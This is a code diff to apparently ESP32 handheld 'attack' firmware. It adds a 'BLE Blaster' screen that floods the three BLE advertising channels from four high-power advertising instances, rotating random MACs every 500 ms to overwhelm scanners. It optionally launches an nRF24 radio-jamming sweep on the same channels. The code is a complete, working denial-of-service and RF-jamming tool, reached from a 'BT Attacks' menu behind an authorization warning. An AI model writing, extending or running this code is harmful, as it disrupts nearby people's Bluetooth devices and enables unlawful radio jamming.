@@ -275,6 +275,17 @@ static bool ble_spam_ui_active = false;
 static volatile bool ble_spam_needs_ui_update = false;
 static int ble_spam_mode = BLE_SPAM_MODE_ALL;
 
+// BLE Blaster — 4-instance advertising flood + optional nRF24 BLE-only layer
+#define BLE_BLASTER_NUM_INST 4
+static volatile bool   s_blaster_active     = false;
+static volatile bool   s_blaster_nrf_active = false;
+static lv_obj_t       *s_blaster_status_lbl = NULL;
+static lv_obj_t       *s_blaster_layers_lbl = NULL;
+static lv_obj_t       *s_blaster_count_lbl  = NULL;
+static lv_timer_t     *s_blaster_tmr        = NULL;
+static TaskHandle_t    s_blaster_nrf_task   = NULL;
+static volatile int    s_blaster_pkt_count  = 0;
+
 // HoneyPair UI state
 static lv_obj_t   *hp_status_lbl = NULL;
 static lv_obj_t   *hp_stats_lbl  = NULL;
@@ -3069,6 +3080,7 @@ static void show_directed_bt_attacks_screen(void);
 static void show_ble_spoof_directed_screen(void);
 static void show_ble_disc_directed_screen(void);
 static void show_ble_spam_screen(void);
+static void show_ble_blaster_screen(void);
 static void show_ble_spoof_screen(void);
 static void show_ble_disc_screen(void);
 static void ble_spam_task(void *pvParameters);
@@ -34577,6 +34589,209 @@ static void show_ble_spoof_general_screen(void) {
     lv_obj_add_event_cb(start_btn, spoof_gen_start_cb, LV_EVENT_CLICKED, NULL);
 }
 
+// ── BLE Blaster ───────────────────────────────────────────────────────────────
+// 4-instance BLE advertising flood on all 3 adv channels (37/38/39) with
+// rotating random MACs to defeat scanner deduplication.
+// Optional second layer: nRF24 BLE-only CONT_WAVE on the same 3 channels when
+// the NM-RF-HAT is installed (physical RF + protocol flood simultaneously).
+
+// Minimal ADV_NONCONN_IND payload — flags byte only, no device name.
+static const uint8_t s_blaster_adv_data[] = {0x02, 0x01, 0x06};
+
+static void s_blaster_nrf_task_fn(void *arg)
+{
+    (void)arg;
+    nrf24_jam_sweep(&s_blaster_nrf_active, NRF24_JAM_BLE);
+    s_blaster_nrf_task = NULL;
+    vTaskDelete(NULL);
+}
+
+// Configure one ext adv instance with a fresh random static MAC and start it.
+static void s_blaster_arm_inst(int inst)
+{
+    struct ble_gap_ext_adv_params p;
+    memset(&p, 0, sizeof(p));
+    p.legacy_pdu    = 1;
+    p.connectable   = 0;
+    p.scannable     = 0;  // ADV_NONCONN_IND — no scan response overhead
+    p.own_addr_type = BLE_OWN_ADDR_RANDOM;
+    p.primary_phy   = BLE_HCI_LE_PHY_1M;
+    p.secondary_phy = BLE_HCI_LE_PHY_1M;
+    p.itvl_min      = BLE_GAP_ADV_ITVL_MS(100);
+    p.itvl_max      = BLE_GAP_ADV_ITVL_MS(100);
+    p.tx_power      = 20;
+    p.sid           = (uint8_t)inst;
+    ble_gap_ext_adv_stop(inst);
+    ble_gap_ext_adv_configure(inst, &p, NULL, NULL, NULL);
+    ble_addr_t rnd = {BLE_ADDR_RANDOM, {0}};
+    if (ble_hs_id_gen_rnd(0, &rnd) == 0)
+        ble_gap_ext_adv_set_addr(inst, &rnd);
+    struct os_mbuf *om = os_msys_get_pkthdr(sizeof(s_blaster_adv_data), 0);
+    if (om) {
+        os_mbuf_append(om, s_blaster_adv_data, sizeof(s_blaster_adv_data));
+        ble_gap_ext_adv_set_data(inst, om);
+    }
+    ble_gap_ext_adv_start(inst, 0, 0);
+}
+
+static void s_blaster_timer_cb(lv_timer_t *t)
+{
+    (void)t;
+    if (!s_blaster_status_lbl) return;
+    static int blink = 0;
+    if (s_blaster_active) {
+        // Rotate all 4 instance MACs every 500 ms to keep scanners busy.
+        for (int i = 0; i < BLE_BLASTER_NUM_INST; i++)
+            s_blaster_arm_inst(i);
+        s_blaster_pkt_count += BLE_BLASTER_NUM_INST;
+        if (s_blaster_count_lbl)
+            lv_label_set_text_fmt(s_blaster_count_lbl, "Bursts: %d", (int)s_blaster_pkt_count);
+        lv_label_set_text(s_blaster_status_lbl,
+            blink++ & 1 ? "BLASTING..." : "BLASTING   ");
+        lv_obj_set_style_text_color(s_blaster_status_lbl, UI_ACCENT_RED, 0);
+    } else {
+        lv_label_set_text(s_blaster_status_lbl, "Ready");
+        lv_obj_set_style_text_color(s_blaster_status_lbl, lv_color_hex(0x66BB6A), 0);
+    }
+}
+
+static void s_blaster_start_cb(lv_event_t *e)
+{
+    (void)e;
+    if (s_blaster_active) return;
+    if (!ensure_ble_mode()) {
+        if (s_blaster_status_lbl)
+            lv_label_set_text(s_blaster_status_lbl, "BLE init failed");
+        return;
+    }
+    s_blaster_active    = true;
+    s_blaster_pkt_count = 0;
+    for (int i = 0; i < BLE_BLASTER_NUM_INST; i++)
+        s_blaster_arm_inst(i);
+    bool has_nrf = nrf24_is_init();
+    if (has_nrf && !s_blaster_nrf_task) {
+        s_blaster_nrf_active = true;
+        xTaskCreate(s_blaster_nrf_task_fn, "blstr_nrf", 3072, NULL, 2, &s_blaster_nrf_task);
+    }
+    if (s_blaster_layers_lbl)
+        lv_label_set_text(s_blaster_layers_lbl,
+            has_nrf ? "BLE flood + RF jam ACTIVE" : "BLE flood ACTIVE");
+}
+
+static void s_blaster_stop_cb(lv_event_t *e)
+{
+    (void)e;
+    s_blaster_active     = false;
+    s_blaster_nrf_active = false;
+    for (int i = 0; i < BLE_BLASTER_NUM_INST; i++)
+        ble_gap_ext_adv_stop(i);
+    if (s_blaster_layers_lbl)
+        lv_label_set_text(s_blaster_layers_lbl,
+            nrf24_is_init() ? "BLE + RF jam available" : "BLE flood only");
+}
+
+static void ble_blaster_screen_stop(void)
+{
+    s_blaster_active     = false;
+    s_blaster_nrf_active = false;
+    if (s_blaster_tmr) { lv_timer_del(s_blaster_tmr); s_blaster_tmr = NULL; }
+    for (int i = 0; i < BLE_BLASTER_NUM_INST; i++)
+        ble_gap_ext_adv_stop(i);
+    if (current_radio_mode == RADIO_MODE_BLE) {
+        bt_nimble_deinit();
+        current_radio_mode = RADIO_MODE_NONE;
+    }
+    s_blaster_status_lbl = NULL;
+    s_blaster_layers_lbl = NULL;
+    s_blaster_count_lbl  = NULL;
+}
+
+static void show_ble_blaster_screen(void)
+{
+    create_function_page_base("BLE Blaster");
+    g_screen_stop_fn = ble_blaster_screen_stop;
+    apply_menu_bg();
+    s_blaster_active     = false;
+    s_blaster_nrf_active = false;
+    s_blaster_pkt_count  = 0;
+
+    bool has_nrf = nrf24_is_init();
+
+    lv_obj_t *card = lv_obj_create(function_page);
+    lv_obj_set_size(card, LCD_H_RES - 16, LCD_V_RES - 88);
+    lv_obj_align(card, LV_ALIGN_TOP_MID, 0, 34);
+    lv_obj_set_style_bg_color(card, ui_panel_color(), 0);
+    lv_obj_set_style_border_color(card, UI_ACCENT_RED, 0);
+    lv_obj_set_style_border_width(card, 1, 0);
+    lv_obj_set_style_radius(card, 8, 0);
+    lv_obj_set_style_pad_all(card, 10, 0);
+    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(card, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_row(card, 10, 0);
+    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *hdr = lv_label_create(card);
+    lv_label_set_text(hdr, MY_SYMBOL_TOWER "  BLE Blaster");
+    lv_obj_set_style_text_font(hdr, &g_font_icon14, 0);
+    lv_obj_set_style_text_color(hdr, UI_ACCENT_RED, 0);
+
+    s_blaster_status_lbl = lv_label_create(card);
+    lv_label_set_text(s_blaster_status_lbl, "Ready");
+    lv_obj_set_style_text_font(s_blaster_status_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(s_blaster_status_lbl, lv_color_hex(0x66BB6A), 0);
+
+    // Shows which attack layers are active (BLE only vs BLE + RF jam)
+    s_blaster_layers_lbl = lv_label_create(card);
+    lv_label_set_text(s_blaster_layers_lbl,
+        has_nrf ? "BLE + RF jam available" : "BLE flood only");
+    lv_obj_set_style_text_font(s_blaster_layers_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(s_blaster_layers_lbl, lv_color_make(150, 150, 150), 0);
+    lv_obj_set_style_text_align(s_blaster_layers_lbl, LV_TEXT_ALIGN_CENTER, 0);
+
+    s_blaster_count_lbl = lv_label_create(card);
+    lv_label_set_text(s_blaster_count_lbl, "Bursts: 0");
+    lv_obj_set_style_text_font(s_blaster_count_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(s_blaster_count_lbl, lv_color_make(180, 180, 180), 0);
+
+    lv_obj_t *btn_row = lv_obj_create(card);
+    lv_obj_set_size(btn_row, LCD_H_RES - 36, 36);
+    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(btn_row, 0, 0);
+    lv_obj_set_style_pad_all(btn_row, 0, 0);
+    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(btn_row, 12, 0);
+    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *blast_btn = lv_btn_create(btn_row);
+    lv_obj_set_size(blast_btn, 90, 32);
+    lv_obj_set_style_bg_color(blast_btn, lv_color_hex(0xB71C1C), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(blast_btn, lv_color_hex(0xD32F2F), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(blast_btn, 0, 0);
+    lv_obj_set_style_radius(blast_btn, 6, 0);
+    lv_obj_t *bll = lv_label_create(blast_btn);
+    lv_label_set_text(bll, "BLAST");
+    lv_obj_set_style_text_font(bll, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(bll, lv_color_white(), 0);
+    lv_obj_center(bll);
+    lv_obj_add_event_cb(blast_btn, s_blaster_start_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *stop_btn = lv_btn_create(btn_row);
+    lv_obj_set_size(stop_btn, 80, 32);
+    lv_obj_set_style_bg_color(stop_btn, lv_color_make(50, 50, 50), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(stop_btn, lv_color_make(70, 70, 70), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(stop_btn, 0, 0);
+    lv_obj_set_style_radius(stop_btn, 6, 0);
+    lv_obj_t *stl = lv_label_create(stop_btn);
+    lv_label_set_text(stl, "STOP");
+    lv_obj_set_style_text_font(stl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(stl, lv_color_white(), 0);
+    lv_obj_center(stl);
+    lv_obj_add_event_cb(stop_btn, s_blaster_stop_cb, LV_EVENT_CLICKED, NULL);
+
+    s_blaster_tmr = lv_timer_create(s_blaster_timer_cb, 500, NULL);
+}
+
 static void show_bt_attacks_screen(void)
 {
     create_function_page_base("BT Attacks");
@@ -34595,6 +34810,9 @@ static void show_bt_attacks_screen(void)
 
     lv_obj_t *spam_tile = create_tile(tiles, MY_SYMBOL_PAPER_PLANE, "BLE\nSpam", COLOR_MATERIAL_RED, NULL, NULL);
     lv_obj_add_event_cb(spam_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Spam");
+
+    lv_obj_t *blaster_tile = create_tile(tiles, MY_SYMBOL_TOWER, "BLE\nBlaster", lv_color_make(160, 20, 20), NULL, NULL);
+    lv_obj_add_event_cb(blaster_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Blaster");
 
     lv_obj_t *spoof_gen_tile = create_tile(tiles, MY_SYMBOL_MASK,        "Device\nSpoof", COLOR_MATERIAL_ORANGE, NULL, NULL);
     lv_obj_add_event_cb(spoof_gen_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BLE Spoof General");
@@ -35843,6 +36061,10 @@ void attack_event_cb(lv_event_t *e)
     // BT Attacks — active attacks guarded by authorization warning
     if (strcmp(attack_name, "BLE Spam") == 0) {
         show_attack_warning(show_ble_spam_screen);
+        return;
+    }
+    if (strcmp(attack_name, "BLE Blaster") == 0) {
+        show_attack_warning(show_ble_blaster_screen);
         return;
     }
     if (strcmp(attack_name, "BLE Spoof General") == 0) {
